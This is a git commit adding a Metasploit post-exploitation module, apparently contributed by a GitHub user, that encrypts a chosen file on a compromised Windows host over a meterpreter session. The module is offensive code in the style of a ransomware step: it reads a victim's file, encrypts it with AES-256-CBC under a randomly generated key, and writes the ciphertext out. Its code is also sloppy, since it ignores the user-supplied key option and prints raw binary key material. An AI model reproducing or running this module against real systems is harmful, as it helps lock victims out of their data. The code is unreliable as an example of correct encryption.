3844d04d13c0439f3d92d55f743e32b271a50635
Galapag0s <47836093+Galapag0s@users.noreply.github.com>
2019-12-19 13:02:58 -0500

    Create encrypt_file.rb

---
+++ encrypt_file.rb
@@ -0,0 +1,53 @@
+##
+# This module requires Metasploit: https://metasploit.com/download
+# Current source: https://github.com/rapid7/metasploit-framework
+##
+
+class MetasploitModule < Msf::Post
+  include Msf::Post::File  
+  require 'openssl'
+  require 'msf/core'
+
+  def initialize(info = {})
+    super(update_info(info,
+        'Name'          => 'Windows File Encryptor',
+        'Description'   => %q{
+          This module will encrypt a target file.
+        },
+        'License'       => MSF_LICENSE,
+        'Author'        => [ 'Galapag0s' ],
+        'Platform'      => [ 'win' ],
+        'SessionTypes'  => [ 'meterpreter' ]
+    ))
+    register_options(
+    [
+	OptString.new('PATH', [ true, 'Specify a file to be encrypted.', 'C:\\User\\' ]),
+	OptString.new('DESTINATION', [ true, 'Specify a destination for the encrypted file.', 'C:\\Temp' ]),
+	OptString.new('KEY', [ true, 'Specify an encryption key.', 'Password' ]),    
+    ], self.class)
+    end
+
+  def run
+    #Check if file exists
+    filepathvar = datastore['PATH']
+    destpath = datastore['DESTINATION']
+    if exist?(filepathvar)
+        cipher = OpenSSL::Cipher.new('aes-256-cbc')
+	cipher.encrypt
+	key = cipher.random_key
+	print_good('The Key Is: ' + key)
+	iv = cipher.random_iv
+	print_good('The IV Is: ' + iv)
+	
+	buffer = read_file(filepathvar)
+	outf = ''
+	outf << cipher.update(buffer)
+	outf << cipher.final
+	print_good(outf)
+	write_file(destpath,outf)
+    else
+    #If file doesn't exist throw an error
+        print_error('Cannot read specified file.')
+    end
+  end
+end
